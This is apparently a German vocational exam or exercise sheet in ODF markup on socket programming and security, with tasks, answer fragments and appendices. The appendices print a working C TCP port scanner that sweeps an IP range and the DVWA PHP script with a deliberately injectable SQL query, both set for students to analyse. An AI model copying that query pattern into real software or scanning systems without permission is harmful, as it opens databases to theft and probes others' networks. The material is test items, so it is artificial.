      <text:p text:style-name="P22">Gitlab: <text:a xlink:type="simple" xlink:href="https://gitlab.com/4me/courses/tree/master">https://gitlab.com/4me/courses/tree/master</text:a></text:p>
      <text:p text:style-name="P28"><text:bookmark-start text:name="__RefHeading__5982_1458299649"/><text:bookmark-end text:name="__RefHeading__5982_1458299649"/></text:p>
      <text:h text:style-name="Heading_20_1" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__21122_660407764"/>WEB-NW-PROG: <text:span text:style-name="T9">Socket, Webservice, REST</text:span><text:bookmark-end text:name="__RefHeading__21122_660407764"/></text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="P56" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8475_2092099876"/><text:span text:style-name="T31">Socket-C:</text:span> <text:s/><text:a xlink:type="simple" xlink:href="#4.1.Anlage: portscanner.c  ????|outline">Anlage portscanner</text:a><text:bookmark-end text:name="__RefHeading__8475_2092099876"/></text:h>
      <text:p text:style-name="P2">In der <text:a xlink:type="simple" xlink:href="#4.1.Anlage: portscanner.c  ????|outline">Anlage portscanner</text:a> finden Sie ein Programmlisting (portscanner.c)</text:p>
      <text:list xml:id="list5805798973271323495" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P40">Beschreiben Sie die Funktionalität. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Geben Sie einen Einblick in die Grundlagen der Netzwerkprogrammierung</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">Zeigen Sie den allg. Aufbau eines Serverprogrammes basierend auf dem Socket-API.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:h text:style-name="P57" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8477_2092099876"/>Socket-C: Grundlagen<text:bookmark-end text:name="__RefHeading__8477_2092099876"/></text:h>
      <text:p text:style-name="P2">Sie sollen aus einer monolithischen Adressverwaltung eine Client/Server – Lösung entwickeln.</text:p>
      <text:list xml:id="list8088516101488964045" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P41">Geben Sie einen kurzen Einblick in die Grundlagen der Netzwerkprogrammierung (OSI-Modell, IP, TCP,UDP, Namensauflösung, Portadressen)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Zeigen Sie den generellen Ablauf beim Server und beim Client und ordnen Sie die entsprechenden Funktionen des SOCKET-API zu. (accept(), bind(), close(), listen(), read(), socket(), write())</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">struct hostent, struct sockaddr_in, struct in_addr<text:line-break/>sind Datenstrukturen, die bei der Netzwerkprogrammierung Verwendung finden. Gehen Sie auf die jeweiligen Komponenten ein.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:h text:style-name="P57" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8479_2092099876"/><text:span text:style-name="T36">+</text:span>Socket-Java: Grundlagen<text:bookmark-end text:name="__RefHeading__8479_2092099876"/></text:h>
      <text:p text:style-name="P2">Sie sollen aus einer monolithischen Adressverwaltung eine Client/Server – Lösung entwickeln.</text:p>
      <text:list xml:id="list150257986305831" text:continue-list="list8088516101488964045" text:style-name="L3">
        <text:list-item text:start-value="1">
          <text:p text:style-name="P41">Geben Sie einen kurzen Einblick in die Grundlagen der Netzwerkprogrammierung (OSI-<text:soft-page-break/>Modell, IP, TCP,UDP, Namensauflösung, Portadressen)</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Zeigen Sie den generellen Ablauf beim Server und beim Client und ordnen Sie die entsprechenden Funktionen des SOCKET-API zu. (accept(), bind(), close(), listen(), read(), socket(), write())</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P41">Welche Komponenten bietet das Java-Framework? </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P21">Antwort:</text:p>
      <text:p text:style-name="P21">Socket, ServerSocket, mit Input/OutputStreams, InetAddress,</text:p>
      <text:p text:style-name="P21">Serverseitig den Service als Thread laufen lassen.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P6"/>
      <text:h text:style-name="P58" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23584_660407764"/>Socket-CPP: <text:s/><text:a xlink:type="simple" xlink:href="#4.2.Anlage Socket-CPP  1/2|outline">Anlage Socket-CPP</text:a><text:bookmark-end text:name="__RefHeading__23584_660407764"/></text:h>
      <text:p text:style-name="Standard">1. Geben Sie einen generellen Einblick in das Socket-API.</text:p>
      <text:p text:style-name="Standard">2. Beantworten Sie die <text:span text:style-name="T35">in</text:span> <text:a xlink:type="simple" xlink:href="#4.2.Anlage Socket-CPP  1/2|outline">Anlage Socket-CPP</text:a> <text:span text:style-name="T35">gestellten Fragen.</text:span></text:p>
      <text:p text:style-name="P31"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23586_660407764"/>Webservices ???<text:bookmark-end text:name="__RefHeading__23586_660407764"/></text:h>
      <text:p text:style-name="P20">hier <text:span text:style-name="T35">noch </text:span>nicht behandelt</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23588_660407764"/>REST ???<text:bookmark-end text:name="__RefHeading__23588_660407764"/></text:h>
      <text:p text:style-name="P19">hier <text:span text:style-name="T35">noch </text:span>nicht behandelt</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23590_660407764"/>REST und Authentifizierungsmechanismen ???<text:bookmark-end text:name="__RefHeading__23590_660407764"/></text:h>
      <text:p text:style-name="Standard">hier <text:span text:style-name="T35">noch </text:span>nicht behandelt</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="P52" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__21126_660407764"/>SEC: Sicherheit, Datenschutz<text:bookmark-end text:name="__RefHeading__21126_660407764"/></text:h>
      <text:p text:style-name="P29"/>
      <text:h text:style-name="P56" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__14221_660407764"/><text:span text:style-name="T36">+SENG-RECHT: </text:span>Lizenzmodelle<text:bookmark-end text:name="__RefHeading__14221_660407764"/></text:h>
      <text:p text:style-name="P18">Bei der Erstellung von Diplomarbeiten sollte man sich für ein passendes Lizenzmodell entscheiden. Geben Sie einen Überblick zu diesem Thema.</text:p>
      <text:p text:style-name="P8"/>
      <text:h text:style-name="P56" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21124_660407764"/><text:soft-page-break/><text:span text:style-name="T36">+</text:span>SENG-RECHT: Datenschutz<text:bookmark-end text:name="__RefHeading__21124_660407764"/></text:h>
      <text:p text:style-name="P12">hier nicht behandelt. </text:p>
      <text:p text:style-name="P10"/>
      <text:h text:style-name="P59" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21128_660407764"/>SEC:<text:a xlink:type="simple" xlink:href="#4.2.ANLAGE SSL|outline"><text:span text:style-name="T11">ANLAGE SSL.</text:span></text:a><text:bookmark-end text:name="__RefHeading__21128_660407764"/></text:h>
      <text:p text:style-name="P23"><text:span text:style-name="T11">Beantworten Sie die Fragen in</text:span><text:a xlink:type="simple" xlink:href="#4.2.ANLAGE SSL|outline"><text:span text:style-name="T11">ANLAGE SSL.</text:span></text:a></text:p>
      <text:p text:style-name="P23"/>
      <text:h text:style-name="P60" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__23561_660407764"/>SEC-<text:span text:style-name="T14">DB</text:span>: <text:span text:style-name="T30"><text:s/></text:span><text:a xlink:type="simple" xlink:href="#3.15.Anlage: DB-SEC: grant|outline"><text:span text:style-name="T30">Anlage DB-SEC:</text:span></text:a><text:a xlink:type="simple" xlink:href="#3.15.Anlage: DB-SEC: grant|outline"><text:span text:style-name="T30">grant</text:span></text:a><text:span text:style-name="T30"> , <text:s/></text:span><text:a xlink:type="simple" xlink:href="#3.14.Anlage: DB-SEC: SQL-Injection|outline"><text:span text:style-name="T30">Anlage DB-SEC:</text:span></text:a><text:a xlink:type="simple" xlink:href="#3.14.Anlage: DB-SEC: SQL-Injection|outline"><text:span text:style-name="T30">Sql-Injection</text:span></text:a><text:bookmark-end text:name="__RefHeading__23561_660407764"/></text:h>
      <text:p text:style-name="P25">1. Besprechen Sie die i<text:span text:style-name="T13">n </text:span>der <text:a xlink:type="simple" xlink:href="#3.15.Anlage: DB-SEC: grant|outline">Anlage DB-SEC:</text:a><text:a xlink:type="simple" xlink:href="#3.15.Anlage: DB-SEC: grant|outline"><text:span text:style-name="T13">grant</text:span></text:a> zu sehenden SQL-Anweisungen und gehen Sie insbesondere auf d<text:span text:style-name="T13">i</text:span>e User- und Rechteverwaltung bei DB-Systemen ein.</text:p>
      <text:p text:style-name="P25">2. <text:span text:style-name="T13">Beantworten</text:span> Sie die i<text:span text:style-name="T13">n </text:span>der <text:a xlink:type="simple" xlink:href="#3.14.Anlage: DB-SEC: SQL-Injection|outline">Anlage DB-SEC:</text:a><text:a xlink:type="simple" xlink:href="#3.14.Anlage: DB-SEC: SQL-Injection|outline"><text:span text:style-name="T13">Sql-Injection</text:span></text:a> <text:span text:style-name="T13">stehenden Fragen.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__6324_1762544912"/>SEC-PHP: <text:span text:style-name="T32">Sql-injection</text:span><text:bookmark-end text:name="__RefHeading__6324_1762544912"/></text:h>
      <text:p text:style-name="Standard">Gegeben ist das in der ANLAGE PHP-SEC gezeigte php-Skript. </text:p>
      <text:p text:style-name="Standard">1. Besprechen Sie den Zugriff auf die Datenbank. Offensichtlich fehlen einige Funktionsaufrufe.</text:p>
      <text:p text:style-name="Standard">2. SQL-Injection stellt u.a. eine Gefahr dar. Wie können Sie derartige Probleme umgehen?</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="Text_20_body">ANLAGE PHP-SEC</text:p>
      <text:p text:style-name="P49">Datei: htdocs/dvwa/vulnerabilities/sqli/source/low.php</text:p>
      <text:p text:style-name="P34">&lt;?php<text:tab/></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34">if(isset($_GET['Submit'])){</text:p>
      <text:p text:style-name="P34"><text:tab/></text:p>
      <text:p text:style-name="P34"><text:tab/>// Retrieve data</text:p>
      <text:p text:style-name="P34"><text:tab/></text:p>
      <text:p text:style-name="P34"><text:tab/><text:span text:style-name="T27">$id = $_GET['id'];</text:span></text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/>$getid = "SELECT first_name, last_name FROM users WHERE user_id = '<text:span text:style-name="T27">$id</text:span><text:span text:style-name="T33">'</text:span>";</text:p>
      <text:p text:style-name="P34"><text:tab/>$result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error(). '&lt;/pre&gt;' );</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/>$num = mysql_numrows($result);</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/>$i = 0;</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/>while ($i &lt; $num) {</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$first = mysql_result($result,$i,"first_name");</text:p>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$last = mysql_result($result,$i,"last_name");</text:p>
      <text:p text:style-name="P34"><text:soft-page-break/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$html .= '&lt;pre&gt;';</text:p>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$html .= 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last;</text:p>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$html .= '&lt;/pre&gt;';</text:p>
      <text:p text:style-name="P34"/>
      <text:p text:style-name="P34"><text:tab/><text:tab/>$i++;</text:p>
      <text:p text:style-name="P34"><text:tab/>}</text:p>
      <text:p text:style-name="P34">}</text:p>
      <text:p text:style-name="P34">?&gt;</text:p>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P50"/>
      <text:h text:style-name="P61" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21048_660407764"/>SEC: <text:s/><text:a xlink:type="simple" xlink:href="#2.6.ANLAGE Diffie-Hellman|outline"><text:span text:style-name="T5">Anlage Diffie-Hellman</text:span></text:a><text:bookmark-end text:name="__RefHeading__21048_660407764"/></text:h>
      <text:p text:style-name="P9">1. Erklären Sie den Diffie-Hellman Algorithmus.</text:p>
      <text:p text:style-name="P9">2. Füllen Sie die Lücken in der <text:a xlink:type="simple" xlink:href="#2.6.ANLAGE Diffie-Hellman|outline">Anlage Diffie-Hellman</text:a>.</text:p>
      <text:p text:style-name="P9"/>
      <text:h text:style-name="P53" text:outline-level="1"><text:bookmark-start text:name="__RefHeading__5912_1458299649"/>Anlage<text:span text:style-name="T1">n: WEB-NW-PROG-DATENSICHERHEIT</text:span><text:bookmark-end text:name="__RefHeading__5912_1458299649"/></text:h>
      <text:h text:style-name="P42" text:outline-level="2"/>
      <text:h text:style-name="P65" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__8481_2092099876"/>Anlage<text:bookmark-start text:name="Anlage portscanner"/>: portscanner.c<text:bookmark-end text:name="__RefHeading__8481_2092099876"/><text:bookmark-end text:name="Anlage portscanner"/></text:h>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;string.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;sys/types.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;sys/socket.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;netinet/in.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;arpa/inet.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;unistd.h&gt;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">#include &lt;netdb.h&gt;</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text">int main(int argc, char *argv[]){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>struct sockaddr_in addr;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>struct servent *serv;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>int s, i;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>unsigned long begin, end, curr;</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>if (argc &lt; 3){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>fprintf(stderr, "usage: %s &lt;begin&gt; &lt;end&gt;\n", argv[0]);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>return 1;}</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>begin = ntohl(inet_addr(argv[1]));</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>end = ntohl(inet_addr(argv[2]));</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>if (begin &gt; end){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>curr = end; end = begin; begin = curr;}</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>for (curr = begin; curr &lt;= end; curr++){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>addr.sin_addr.s_addr = htonl(curr);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>printf("%s:\n", inet_ntoa(addr.sin_addr));</text:span></text:p>
      <text:p text:style-name="code"/>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>for (i = 0; i &lt; 1024; i++){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>s = socket(PF_INET, SOCK_STREAM, 0);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>if (s == -1){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/><text:tab/>perror("socket() failed"); return 3;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>addr.sin_addr.s_addr = htonl(curr);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>addr.sin_port = htons(i);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>addr.sin_family = AF_INET;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>printf("%i\r", i); fflush(stdout);<text:line-break/></text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>if (!connect(s, (struct sockaddr*)&amp;addr, sizeof(addr))){</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/><text:tab/>serv = getservbyport(addr.sin_port, "tcp");</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/><text:tab/>if (serv)<text:tab/>printf("%i (%s) open\n", i, serv-&gt;s_name);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/><text:tab/>else <text:tab/><text:tab/>printf("%i (unknown) open\n", i);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/><text:tab/>close(s);</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/><text:tab/>puts("----");</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>}</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:tab/>return 0;</text:span></text:p>
      <text:p text:style-name="code"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">}</text:span></text:span></text:p>
      <text:h text:style-name="P62" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__6326_1762544912"/><text:soft-page-break/>Anlage Socket-CPP <text:s/><text:span text:style-name="T35">1/2</text:span><text:bookmark-end text:name="__RefHeading__6326_1762544912"/></text:h>
      <text:p text:style-name="P38">1. Fill in <text:span text:style-name="T35">the words </text:span>ServerSocket, ClientSocket</text:p>
      <text:p text:style-name="P35"><text:line-break/>class ________________ <text:s/>: private Socket{</text:p>
      <text:p text:style-name="P35"><text:s text:c="5"/>public:</text:p>
      <text:p text:style-name="P35"><text:s text:c="10"/>___________________( int port ); // constructor</text:p>
      <text:p text:style-name="P35">};</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">class <text:s text:c="2"/>_____________________ : private Socket{</text:p>
      <text:p text:style-name="P35"><text:s text:c="5"/>public:</text:p>
      <text:p text:style-name="P35"><text:s text:c="8"/>_____________________ ( string host, int port ); // constructor</text:p>
      <text:p text:style-name="P35">};</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38">2. Fill in the words: accept,bind,listen,send,socket,....</text:p>
      <text:p text:style-name="P35">bool Socket::create(){</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_sock = :: ___________________ ( AF_INET, SOCK_STREAM, 0 );</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">bool Socket::_____________________ ( const int port ){</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_addr.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_addr.sin_addr.s_addr = INADDR_ANY;</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_addr.sin_port = htons ( port );</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>int ret = :: ___________________ ( m_sock,<text:line-break/> <text:s text:c="36"/>( struct sockaddr * ) &amp;m_addr,<text:line-break/> <text:s text:c="36"/>sizeof ( m_addr ) );</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>return ret != -1;</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">bool Socket:: ____________________() const {</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>int ret = :: <text:s/>______________________( m_sock, MAXCONNECTIONS );</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>return ret != -1;</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">bool Socket:: _______________________ ( Socket&amp; new_socket ) const {</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>int addr_length = sizeof ( m_addr );</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>new_socket.m_sock = :: _______________( m_sock, <text:line-break/> <text:s text:c="40"/>( sockaddr * ) &amp;m_addr,<text:line-break/> <text:s text:c="40"/>( socklen_t * ) &amp;addr_length );</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>if ( new_socket.m_sock &lt;= 0 ) return false;</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>else return true;</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:h text:style-name="P62" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__6328_1762544912"/><text:soft-page-break/>Anlage Socket-CPP <text:s/><text:span text:style-name="T35">2/2</text:span><text:bookmark-end text:name="__RefHeading__6328_1762544912"/></text:h>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">bool Socket:: _______________________ ( const std::string s ) const{<text:line-break/></text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>int status =:: ____________________________ ( m_sock, <text:line-break/> <text:s text:c="47"/>s.c_str(), <text:line-break/> <text:s text:c="47"/>s.size(), MSG_NOSIGNAL);</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>return status != -1;</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35">bool Socket:: ______________ ( const std::string host, const int port ){</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_addr.sin_family = AF_INET;</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>m_addr.sin_port = htons ( port );</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>int status = inet_pton ( AF_INET, host.c_str(), &amp;m_addr.sin_addr );</text:p>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"/>
      <text:p text:style-name="P35"><text:s text:c="2"/>status =:: _________________________________ ( m_sock, <text:line-break/> <text:s text:c="48"/>( sockaddr* ) &amp;m_addr,<text:line-break/> <text:s text:c="48"/>sizeof ( m_addr ) );</text:p>
      <text:p text:style-name="P35"><text:s text:c="2"/>return status == 0;</text:p>
      <text:p text:style-name="P35">}</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P37">3. Which function is used on which side?</text:p>
      <text:p text:style-name="P38">socket: <text:s/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">accept: <text:s/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">bind: <text:s text:c="3"/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">listen: <text:s/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">send: <text:s text:c="3"/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">recv: <text:s text:c="3"/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38">close: <text:s text:c="2"/><text:span text:style-name="T34">o</text:span> clientside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>serverside-execution <text:s text:c="2"/><text:span text:style-name="T34">o </text:span>bothside-execution.</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38"><text:span text:style-name="T35">4. True or false</text:span> </text:p>
      <text:p text:style-name="P38">The structure sockaddr_in does not hold the hostname. <text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38">The structure sockaddr_in does not hold the portnumber.<text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38">The structure sockaddr_in does not hold the ip Address.<text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P38">bind() <text:tab/>is used by a portscanner program.<text:tab/><text:tab/><text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38">listen() <text:tab/>waits for a client-connection.<text:tab/><text:tab/><text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38">accept() <text:tab/>returns a connection-socket. <text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P38">connect() <text:tab/>is used by a portscanner program.<text:tab/><text:tab/><text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.</text:p>
      <text:p text:style-name="P39">recv() waits until data is available on a <text:tab/><text:tab/><text:tab/><text:span text:style-name="T34">o true <text:s text:c="2"/>o false</text:span>.<text:line-break/>connected socket.<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:p>
      <text:h text:style-name="P66" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__21050_660407764"/>ANLAGE Diffie-Hellman <text:span text:style-name="T5">1/2</text:span><text:bookmark-end text:name="__RefHeading__21050_660407764"/></text:h>
      <text:p text:style-name="P11">Use these Abbreviations: </text:p>
      <text:p text:style-name="P9">TC <text:s text:c="9"/>… Trustcenter</text:p>
      <text:p text:style-name="P9">n <text:s text:c="12"/>... Modulo (prim) </text:p>
      <text:p text:style-name="P11">g <text:s text:c="11"/>... generator</text:p>
      <text:p text:style-name="P11">BPK <text:s text:c="7"/>... Bobs Public Key <text:s text:c="7"/><text:tab/><text:tab/><text:tab/> </text:p>
      <text:p text:style-name="P11">BSN <text:s text:c="7"/>... Bobs Secret Number <text:s text:c="4"/><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P11">APK <text:s text:c="7"/>... Alic<text:span text:style-name="T5">e'</text:span>s Pub<text:span text:style-name="T5">lic</text:span> Key <text:s text:c="7"/><text:tab/><text:tab/> </text:p>
      <text:p text:style-name="P11">ASN <text:s text:c="7"/>... Alice<text:span text:style-name="T5">'</text:span>s Secret Number</text:p>
      <text:p text:style-name="P11">symKey <text:s/>... symmetric Key for Encryption</text:p>
      <text:p text:style-name="P11">M <text:s text:c="7"/><text:tab/> <text:s text:c="2"/>... the message (plainText) </text:p>
      <text:p text:style-name="P11">C <text:s text:c="11"/>... the message (cryptText)</text:p>
      <text:p text:style-name="P11">C=encrypt(M,symKey)</text:p>
